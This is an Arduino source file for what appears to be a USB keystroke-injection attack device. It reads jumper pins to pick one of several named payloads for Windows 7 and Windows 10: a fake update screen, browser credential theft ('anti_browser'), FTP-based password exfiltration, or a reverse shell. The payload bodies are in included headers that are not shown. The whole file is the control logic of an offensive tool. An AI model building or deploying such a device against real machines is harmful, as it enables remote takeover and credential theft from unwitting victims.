
#include <Keyboard.h>

#include "GUI_R.h"

#include "Keyboard_win7.h"

#include "keyboard_anti_browser.h"

#include "keyboard_ftp_win7.h"

#include "keyboard_anti_browser_win10.h"

#include "keyboard_ftp_win10.h"

#include "Keyboard_reverse_shell.h"

/////////////////////////////////////////////////////////////////////////////////////////////////
bool DEBUG = false;   //true - enabled debugging, false - disable debugging
/////////////////////////////////////////////////////////////////////////////////////////////////

bool flashmod = false;
bool attack_anti_browser = false;
bool attack_ftp_download = false;
bool attack_anti_browser_win10 = false;
bool attack_ftp_download_win10 = false;
bool attack_fake_update = false;
bool attack_reverse_shell = false;
bool attack_reverse_shell_win10 = false;
int x = 0;
int aab, afd, afu, ars;

void setup() {

  Serial.begin(9600);
  pinMode(2, INPUT_PULLUP);
  pinMode(3, INPUT_PULLUP);
  pinMode(4, INPUT_PULLUP);
  pinMode(5, INPUT_PULLUP);
  pinMode(6, INPUT_PULLUP);
  pinMode(7, INPUT_PULLUP);

  Keyboard.begin();

  //////////////////////detecting attack type ///////////////////////////////////////////////////////
  if (digitalRead(2) != LOW and digitalRead(3) != LOW and digitalRead(4) != LOW and digitalRead(5) != LOW and digitalRead(6) != LOW and digitalRead(7) != LOW) {
    flashmod = true;
  }

  if (digitalRead(2) == LOW and digitalRead(3) == HIGH and digitalRead(4) == HIGH and digitalRead(5) == HIGH and digitalRead(6) == HIGH and digitalRead(7) == HIGH) {
    attack_fake_update = true;
    x = 7;
    // it's windows 7
    afu = 1;
  }

  if (digitalRead(3) == LOW and digitalRead(2) == HIGH and digitalRead(4) == HIGH and digitalRead(5) == HIGH and digitalRead(6) == HIGH and digitalRead(7) == HIGH) {
    //attack_ftp_download = true;
    attack_anti_browser = true;
    afd = 1;
  }

    if (digitalRead(4) == LOW and digitalRead(2) == HIGH and digitalRead(3) == HIGH and digitalRead(5) == HIGH and digitalRead(6) == HIGH and digitalRead(7) == HIGH) {
    attack_reverse_shell = true;
    ars = 1;
  }


  if (digitalRead(5) == LOW and digitalRead(7) == HIGH and digitalRead(6) == HIGH and digitalRead(4) == HIGH and digitalRead(3) == HIGH and digitalRead(2) == HIGH) {
    attack_fake_update = true;
    x = 10;
    //it's windows 10
    afu = 1;
  }

   if (digitalRead(6) == LOW and digitalRead(2) == HIGH and digitalRead(3) == HIGH and digitalRead(4) == HIGH and digitalRead(5) == HIGH and digitalRead(7) == HIGH) {
    //attack_ftp_download_win10 = true;
    attack_anti_browser_win10 = true;
    afd = 1;
  }

  /*
    if (digitalRead(3) != HIGH and digitalRead(2) != LOW and digitalRead(4) != LOW and digitalRead(5) != LOW) {
    attack_anti_browser = true;
    aab = 1;
    }
  */


  if ( digitalRead(7) == LOW  and digitalRead(2) == HIGH and digitalRead(3) == HIGH  and digitalRead(4) == HIGH and digitalRead(5) == HIGH and digitalRead(6) == HIGH) {
    attack_reverse_shell_win10 = true;
    ars = 1;
  }
  //////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  /*
    if (digitalRead(3) == HIGH and digitalRead(2) == LOW and digitalRead(4) == LOW and digitalRead(5) == LOW) {
    attack_anti_browser_win10 = true;
    }
  */
  
  if (flashmod == true) {
    attack_ftp_download = false;
    attack_anti_browser = false;
    attack_fake_update = false;
    attack_reverse_shell = false;
  }
  ////////////////////finish detecting attack type ////////////////////////////////////////////////////////////////////////////////////////////

  if (attack_ftp_download == true) {
    ftp_pass();
  }

  if (attack_anti_browser == true) {
    anti_browser();
  }

  if (attack_fake_update == true) {
    Fakeupdate(x);
  }
  if (attack_ftp_download_win10 == true) {
    ftp_pass_win10();
  }

  if (attack_anti_browser_win10 == true) {
    anti_browser_win10();
  }

  if (attack_reverse_shell == true) {
    reverse_shell();
  }

  if (attack_reverse_shell_win10 == true) {
    reverse_shell_win10();
  }
}

void loop() {
  if (DEBUG == true) {
    Serial.print("     ");
    Serial.print(afd);
    Serial.print("     ");
    Serial.println(aab);
    Serial.print("     ");
    Serial.print(afu);
    Serial.print("     ");
    Serial.print(ars);
    Serial.print("     ");
    if (flashmod == true ) {
      Serial.println("flashmode");
    }
  }

}
